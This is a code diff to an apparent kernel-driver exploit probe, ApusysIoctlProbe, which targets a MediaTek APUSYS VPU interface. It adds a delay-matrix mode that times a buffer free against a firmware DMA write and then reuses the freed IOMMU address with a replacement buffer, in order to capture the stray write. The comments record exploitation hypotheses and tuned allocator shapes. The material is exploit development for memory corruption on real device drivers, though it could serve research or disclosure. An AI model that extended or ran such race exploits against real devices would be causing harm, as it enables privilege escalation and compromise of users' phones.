@@ -530,6 +530,7 @@ public final class ApusysIoctlProbe {
         boolean runCmdVpuXrpMemFreeRaceCompletedReuseIova = false;
         boolean runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = false;
         boolean runCmdVpuXrpPlaneRedirectGapReuseIova = false;
+        boolean runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova = false;
         boolean runCmdVpuXrpDevCtrlRaceIova = false;
         boolean runCmdVpuXrpDevCtrlMatrixIova = false;
         boolean runCmdVpuXrpTwoCommandSharedIova = false;
@@ -776,6 +777,8 @@ public final class ApusysIoctlProbe {
                 runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = true;
             } else if ("--run-cmd-vpu-xrp-plane-redirect-gap-reuse-iova".equals(arg)) {
                 runCmdVpuXrpPlaneRedirectGapReuseIova = true;
+            } else if ("--run-cmd-vpu-xrp-plane-redirect-gap-reuse-delay-matrix-iova".equals(arg)) {
+                runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova = true;
             } else if ("--run-cmd-vpu-xrp-dev-ctrl-race-iova".equals(arg)) {
                 runCmdVpuXrpDevCtrlRaceIova = true;
             } else if ("--run-cmd-vpu-xrp-dev-ctrl-matrix-iova".equals(arg)) {
@@ -948,6 +951,7 @@ public final class ApusysIoctlProbe {
                 || runCmdVpuXrpMemFreeRaceCompletedReuseIova
                 || runCmdVpuXrpMemFreeRaceCompletedGapReuseIova
                 || runCmdVpuXrpPlaneRedirectGapReuseIova
+                || runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova
                 || runCmdVpuXrpDevCtrlRaceIova
                 || runCmdVpuXrpDevCtrlMatrixIova
                 || runCmdVpuXrpTwoCommandSharedIova
@@ -1558,6 +1562,10 @@ public final class ApusysIoctlProbe {
 
             if (runCmdVpuXrpPlaneRedirectGapReuseIova) {
                 runRunCmdVpuXrpPlaneRedirectGapReuseHardwareBufferProbe();
+            }
+
+            if (runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova) {
+                runRunCmdVpuXrpPlaneRedirectGapReuseDelayMatrixProbe();
             }
 
             if (runCmdVpuXrpDevCtrlRaceIova) {
@@ -5056,9 +5064,35 @@ public final class ApusysIoctlProbe {
         runPlaneRedirectGapReuseCase(0x10000, 12, 8, 20);
     }
 
+    private static void runRunCmdVpuXrpPlaneRedirectGapReuseDelayMatrixProbe()
+            throws Exception {
+        System.out.println("\n[*] === APUSYS run_cmd VPU plane-redirect"
+            + " gap-reuse delay-matrix probe ===");
+        System.out.println("[*] Mode: same as plane-redirect-gap-reuse but"
+            + " with free_delay_ms before mem_free to advance firmware toward"
+            + " its PLN1 write point before tearing down VPU IOMMU mapping.");
+        System.out.println("[*] Hypothesis: delay=7000ms or 8500ms lets"
+            + " firmware approach write, then replacement import re-establishes"
+            + " IOMMU mapping just in time to receive PLN1 write.");
+        loadRuntimeLibraries();
+        // p12/r8 is best allocator shape; 15 iter each (total ~50min for 3 cases)
+        int[] delaysMs = {7000, 8500, 5000};
+        for (int d : delaysMs) {
+            System.out.println("\n[*] === delay_matrix free_delay_ms=" + d + " ===");
+            runPlaneRedirectGapReuseCase(0x10000, 12, 8, 15, d);
+        }
+    }
+
     private static void runPlaneRedirectGapReuseCase(
             int importSize, int poolCount, int replacementCount,
             int iterations) throws Exception {
+        runPlaneRedirectGapReuseCase(importSize, poolCount, replacementCount,
+            iterations, 0);
+    }
+
+    private static void runPlaneRedirectGapReuseCase(
+            int importSize, int poolCount, int replacementCount,
+            int iterations, int freeDelayMs) throws Exception {
         // plane-redirect settings shape: VPU_DESC_LIBVPU_SETTINGS5 with
         // planeValid overlay pointing plane MVA to sharedIova + 0x700.
         VpuDescriptorPlaneOverride planeValidOverride =
@@ -5158,7 +5192,8 @@ public final class ApusysIoctlProbe {
                     + " cmd=0x" + Integer.toHexString(cmd.iovaLow)
                     + " plane_target=0x" + Integer.toHexString(planeTargetIova)
                     + " plane_lower=0x"  + Integer.toHexString(planeLowerIova)
-                    + " pool_fail=" + poolFailures);
+                    + " pool_fail=" + poolFailures
+                    + " free_delay_ms=" + freeDelayMs);
 
                 // ----------------------------------------------------------
                 // 5. Submit async.  Firmware writes PLN1 at
@@ -5168,6 +5203,12 @@ public final class ApusysIoctlProbe {
                 long runRet = submitRunCmdAsync(raceFd, runCmd, cmd.dmaBufFd,
                     "plane_redir_iter_" + iter);
                 if (runRet >= 0) runOk++;
+
+                // Optional delay before freeing: allow firmware to advance
+                // toward its write point before tearing down IOMMU mapping.
+                if (freeDelayMs > 0) {
+                    Thread.sleep(freeDelayMs);
+                }
 
                 // ----------------------------------------------------------
                 // 6. Free plane target + lower (target_then_lower).
@@ -5220,8 +5261,10 @@ public final class ApusysIoctlProbe {
 
                 // ----------------------------------------------------------
                 // 8. Sleep through firmware timeout (~9s) + margin.
+                //    Account for any freeDelayMs already elapsed.
                 // ----------------------------------------------------------
-                Thread.sleep(12000);
+                int remainingSleepMs = Math.max(1000, 12000 - freeDelayMs);
+                Thread.sleep(remainingSleepMs);
 
                 // ----------------------------------------------------------
                 // 9. Check replacement at offset 0x700 for PLN1 marker.
@@ -5295,6 +5338,7 @@ public final class ApusysIoctlProbe {
             + " pool="        + poolCount
             + " replacements=" + replacementCount
             + " iterations="  + iterations
+            + " free_delay_ms=" + freeDelayMs
             + " pair_found="  + pairFound  + "/" + iterations
             + " no_pair="     + noPair
             + " run_ok="      + runOk
